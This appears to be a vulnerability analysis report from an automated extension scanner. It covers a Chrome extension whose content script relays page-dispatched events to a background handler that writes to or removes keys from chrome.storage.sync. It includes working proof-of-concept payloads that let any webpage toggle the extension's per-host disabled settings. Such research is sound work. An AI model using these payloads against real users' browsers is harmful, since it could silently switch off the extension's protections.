# CoCo Analysis: meojnmfhjkahlfcecpdcdgjclcilmaij

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (chrome_storage_sync_set_sink, chrome_storage_sync_remove_sink)

---

## Sink 1: cs_window_eventListener_chrome.runtime.sendMessage → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/meojnmfhjkahlfcecpdcdgjclcilmaij/opgen_generated_files/cs_0.js
Line 467 - window.addEventListener in content script receives attacker-controlled event data

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/meojnmfhjkahlfcecpdcdgjclcilmaij/opgen_generated_files/bg.js
Line 965 - Background script message handler performs chrome.storage.sync.set with attacker data

**Code:**

```javascript
// Content script (cs_0.js Line 467) - Entry point
window.addEventListener("chrome.runtime.sendMessage", function(t) {
  const o = t.detail; // ← attacker-controlled via dispatchEvent
  chrome.runtime.sendMessage(o, function(){}); // Forwards to background
});

// Background script (bg.js Line 965) - Message handler
const P = function(t, o, n) {
  if (!t || !t.action) return n({result:"no action"}), !0;

  if (t.action === "setDisabled") {
    const e = "disabled:" + t.host; // ← attacker controls t.host
    return t.disabled ? (
      chrome.storage.sync.set({[e]: t.disabled}, () => { // ← SINK: storage poisoning
        m().then(() => {n({result:"ok"})}).catch(c => {n({result:"error"})})
      }), !0
    ) : (
      chrome.storage.sync.remove(e, () => { // ← SINK: storage manipulation
        m().then(() => {n({result:"ok"})}).catch(c => {n({result:"error"})})
      }), !0
    );
  }
  // ... other handlers
};
chrome.runtime.onMessage.addListener(P);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event (window.addEventListener)

**Attack:**

```javascript
// From any webpage where the content script runs (all_urls):
const payload = {
  action: "setDisabled",
  host: "evil.com",
  disabled: true
};
window.dispatchEvent(new CustomEvent("chrome.runtime.sendMessage", {detail: payload}));
```

**Impact:** Attacker can poison chrome.storage.sync by setting arbitrary key-value pairs with the "disabled:[host]" pattern. While this is storage write-only (no direct retrieval to attacker), the extension uses this storage to control its behavior, potentially disabling security features or manipulating extension state.

---

## Sink 2: cs_window_eventListener_chrome.runtime.sendMessage → chrome_storage_sync_remove_sink

**CoCo Trace:**
Same flow as Sink 1, but targeting the chrome.storage.sync.remove operation.

**Code:**
Same code path as above - when `t.disabled` is falsy, the code executes `chrome.storage.sync.remove(e)` where `e = "disabled:" + t.host` and `t.host` is attacker-controlled.

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event (window.addEventListener)

**Attack:**

```javascript
// From any webpage where the content script runs (all_urls):
const payload = {
  action: "setDisabled",
  host: "target.com",
  disabled: false  // Triggers remove operation
};
window.dispatchEvent(new CustomEvent("chrome.runtime.sendMessage", {detail: payload}));
```

**Impact:** Attacker can remove specific keys from chrome.storage.sync, potentially re-enabling blocked sites or disrupting extension functionality. Combined with Sink 1, attacker has full control over the "disabled:[host]" storage namespace.
